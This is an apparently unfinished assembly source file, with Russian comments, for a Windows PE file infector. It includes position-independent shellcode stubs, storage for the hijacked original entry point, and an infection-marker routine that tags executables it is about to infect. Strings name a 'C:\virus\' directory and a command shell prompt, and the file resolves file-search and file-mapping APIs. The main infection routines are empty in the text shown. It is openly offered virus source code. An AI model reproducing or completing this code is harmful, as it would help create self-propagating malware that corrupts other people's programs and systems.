ifdef _WIN64
CurrentStdcallNotation equ <fastcall>
CurrentCdeclNotation equ <fastcall>
else 
CurrentStdcallNotation equ <stdcall>
CurrentCdeclNotation equ <c>
.486
endif

option casemap:none
.model flat, CurrentStdcallNotation

include windows.inc



;---------------------MACRO-----------------

INJ_SIGN_OFFSET equ 079h
INJECTION_SIGN 	equ 050h

;-------------------------------------------


PeParser_x86 struct
    filename 	dword   ?   ;имя файла

    fd          dword  ?   ;хендл открытого файла
    mapd        dword  ?   ;хендл файловой проекции
    mem	        dword   ?   ;указатель на память спроецированного файла
    filesize    dword   ?   ;размер спроецированной части файла

    doshead     dword   ?   ;указатель на DOS заголовок
    nthead      dword   ?   ;указатель на NT заголовок
	
    impdir      dword   ?   ;указатель на массив дескрипторов таблицы импорта
    sizeImpdir  DWORD   ?   ;размер таблицы импорта
    countImpdes DWORD   ?   ;количество элементов в таблице импорта

    expdir      dword   ?   ;указатель на таблицу экспорта
    sizeExpdir  DWORD   ?   ;размер таблицы экспорта

    sections    dword   ?   ;указатель на таблицу секций (на первый элемент)
    countSec    DWORD   ?   ;количество секций
PeParser_x86 ends

PeParser_x64 struct
    filename 	qword   ?   ;имя файла

    fd          qword  ?   ;хендл открытого файла
    mapd        qword  ?   ;хендл файловой проекции
    mem	        qword   ?   ;указатель на память спроецированного файла
    filesize    qword   ?   ;размер спроецированной части файла

    doshead     qword   ?   ;указатель на DOS заголовок
    nthead      qword   ?   ;указатель на NT заголовок
	
    impdir      qword   ?   ;указатель на массив дескрипторов таблицы импорта
    sizeImpdir  DWORD   ?   ;размер таблицы импорта
    countImpdes DWORD   ?   ;количество элементов в таблице импорта

    expdir      qword   ?   ;указатель на таблицу экспорта
    sizeExpdir  DWORD   ?   ;размер таблицы экспорта

    sections    qword   ?   ;указатель на таблицу секций (на первый элемент)
    countSec    DWORD   ?   ;количество секций
PeParser_x64 ends

cword typedef qword



;-------------------------------------------



;-------------------------------------------

sc segment

sc_start_x86:
	call $+5
	mov ebx, dword ptr [esp]
	;pop ebx
	sub ebx, 5
	jmp main_x86
sc_end_x86:

sc_start_x64:
	lea rbx, sc_start_x64
	jmp main_x64
sc_end_x64:

	
; адрес оригинальной точки входа;
OriginalEntryPoint:
db 8 dup(?)
; адрес, где сохранены данные секции;
OriginalSectionData:
db 8 dup(?)
; адрес, где расположены перемещенные данные.
ShellcodeData:
db 8 dup(?)
; флаг архитектуры заражаемого PE (0 - x86; 1 - x64)
ArchFlag:
db 0

pe_start_x86:
		
	
	
main_x86 proc 
	local pBase:dword
	
	

main_x86 endp


pe_start_x64:

main_x64 proc 
	local pBase:qword
	

main_x64 endp


CheckPeFile_x64 proc stdcall pe:ptr byte	
	; cdi = pe
	mov rdi, [pe]
    assume rdi: ptr PeParser_x64
	mov rsi, [rdi].mem
	assume rdi: nothing

	lea rsi, [rsi + INJ_SIGN_OFFSET] ; ADDR SIGN

    ;invoke sc_printf, addr [cbx + strFormat], addr [cbx + strCheckPeFile]
	
	; .if [csi].FileHeader.Machine != PROC_VERSION
		; mov cax, 1
		; ret
	; .endif
	
	; проверка сигнатуры
	.if byte ptr [rsi] == INJECTION_SIGN
		mov rax, 1
		ret
	.endif
	
    ;invoke sc_printf, addr [cbx + strFormat], addr [cbx + strPeFileWillBeInjected]
	
	; Этот файл будем заражать - возвращаем 0
	mov byte ptr [rsi], INJECTION_SIGN	
	xor rax, rax
	ret
	
CheckPeFile_x64 endp 


;-------------------------------------------

injCount:
	dd ?
strHello:
	db "Hello, i am shell! Please enter command to execute or 0 to exit!", 13, 10, 0
strCheckPeFile:
	db "Check for injecting...", 13, 10, 0
strPeFileWillBeInjected:
	db "PE file is injected!", 13, 10, 0
strCopy:
	db "copy ", 0
strFormat:
	db "%s", 13, 10, 0
strDecFormat:
	db "DEC: %d", 13, 10, 0
strHexFormat:
	db "HEX: %08X", 13, 10, 0
injDirName:
	db "C:\virus\", 0, 0, 0, 0, 0, 0, 0, 0
	

;-------------------------------------------

DefineFuncNamesAndPointers printf, system, strlen, memcpy, FindFirstFileA, FindNextFileA, FindClose, GetSystemDirectoryA, CreateFileA, ReadFile, GetFileSize, CreateFileMappingA, CloseHandle, MapViewOfFile, UnmapViewOfFile

;-------------------------------------------

sc_end:
sc ends
end

